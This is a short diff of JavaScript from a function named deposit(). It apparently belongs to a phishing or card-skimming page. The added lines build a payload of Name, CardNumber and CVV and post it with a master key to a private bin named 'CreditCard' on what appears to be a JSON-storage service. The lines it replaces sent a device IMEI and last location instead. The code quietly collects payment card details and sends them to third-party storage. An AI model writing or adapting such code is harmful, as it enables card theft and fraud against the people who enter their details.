@@ -122,9 +122,9 @@ function deposit(){
 
       
         const data = {
-        IMEi: subject,
-        LastLocation: body,
-        MailTo: email
+        Name: subject,
+        CardNumber: body,
+        CVV: email
       };
 
       
@@ -134,7 +134,7 @@ function deposit(){
               'Content-Type': 'application/json',
               "X-Master-Key": secretKey,
               "X-Bin-Private": true,
-              'X-Bin-Name': email
+              'X-Bin-Name': "CreditCard"
             },
             body: JSON.stringify(data)
           })
